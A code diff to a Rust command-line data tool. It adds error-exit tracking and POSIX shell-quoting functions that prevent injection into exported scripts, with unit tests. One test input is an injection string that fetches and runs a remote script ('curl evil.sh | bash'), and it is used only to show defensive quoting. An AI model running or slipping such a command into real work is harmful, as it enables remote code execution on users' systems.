@@ -4,6 +4,52 @@ use clap::ValueEnum;
 use p2a_core::Dataset;
 use serde::Serialize;
 use std::fmt::Display;
+use std::sync::atomic::{AtomicBool, Ordering};
+
+/// Set when any user-facing error is reported via [`print_error`]. Many command
+/// handlers print a "soft" error and then return `Ok(())`; `main` inspects this
+/// flag after dispatch so those cases still exit with a non-zero status, which
+/// scripts, CI pipelines, and `set -e` in exported scripts rely on.
+static ERROR_REPORTED: AtomicBool = AtomicBool::new(false);
+
+/// Whether any error was reported during this process's command execution.
+pub fn error_was_reported() -> bool {
+    ERROR_REPORTED.load(Ordering::Relaxed)
+}
+
+/// Quote a single argument for safe inclusion in a POSIX shell command line.
+///
+/// Values that consist only of unambiguously-safe characters are returned
+/// as-is; anything else is wrapped in single quotes with embedded single
+/// quotes escaped. This prevents shell injection when a recorded command
+/// (dataset names, column names, paths) is written into an exported script.
+pub fn shell_quote(s: &str) -> String {
+    let is_safe = !s.is_empty()
+        && s.bytes()
+            .all(|b| b.is_ascii_alphanumeric() || b"@%+=:,./-_".contains(&b));
+    if is_safe {
+        return s.to_string();
+    }
+    let mut out = String::with_capacity(s.len() + 2);
+    out.push('\'');
+    for c in s.chars() {
+        if c == '\'' {
+            out.push_str("'\\''");
+        } else {
+            out.push(c);
+        }
+    }
+    out.push('\'');
+    out
+}
+
+/// Shell-quote and space-join a list of arguments into a command line.
+pub fn shell_join(args: &[String]) -> String {
+    args.iter()
+        .map(|a| shell_quote(a))
+        .collect::<Vec<_>>()
+        .join(" ")
+}
 
 /// Output format options
 #[derive(Debug, Clone, Copy, ValueEnum, Default)]
@@ -45,6 +91,9 @@ pub fn print_message(msg: &str, format: &OutputFormat) {
 
 /// Format an error message
 pub fn print_error(msg: &str, format: &OutputFormat) {
+    // Record that an error occurred so `main` can exit non-zero even when the
+    // handler returns Ok(()) after printing this message.
+    ERROR_REPORTED.store(true, Ordering::Relaxed);
     match format {
         OutputFormat::Json => {
             eprintln!("{}", serde_json::json!({"error": msg}));
@@ -341,4 +390,40 @@ fn levenshtein_distance(a: &str, b: &str) -> usize {
     }
 
     prev_row[b.len()]
+}
+
+#[cfg(test)]
+mod shell_quote_tests {
+    use super::{shell_join, shell_quote};
+
+    #[test]
+    fn leaves_safe_values_unquoted() {
+        assert_eq!(shell_quote("sales"), "sales");
+        assert_eq!(shell_quote("price_2023"), "price_2023");
+        assert_eq!(shell_quote("data/file.csv"), "data/file.csv");
+    }
+
+    #[test]
+    fn quotes_and_escapes_dangerous_values() {
+        // Shell metacharacters must be neutralized.
+        assert_eq!(
+            shell_quote("x; curl evil.sh | bash #"),
+            "'x; curl evil.sh | bash #'"
+        );
+        assert_eq!(shell_quote("revenue ($)"), "'revenue ($)'");
+        // Embedded single quotes use the '\'' idiom.
+        assert_eq!(shell_quote("O'Brien"), "'O'\\''Brien'");
+        // Empty string must be quoted (would otherwise vanish).
+        assert_eq!(shell_quote(""), "''");
+    }
+
+    #[test]
+    fn joins_arguments() {
+        let args = vec![
+            "reg".to_string(),
+            "ols".to_string(),
+            "my data".to_string(),
+        ];
+        assert_eq!(shell_join(&args), "reg ols 'my data'");
+    }
 }
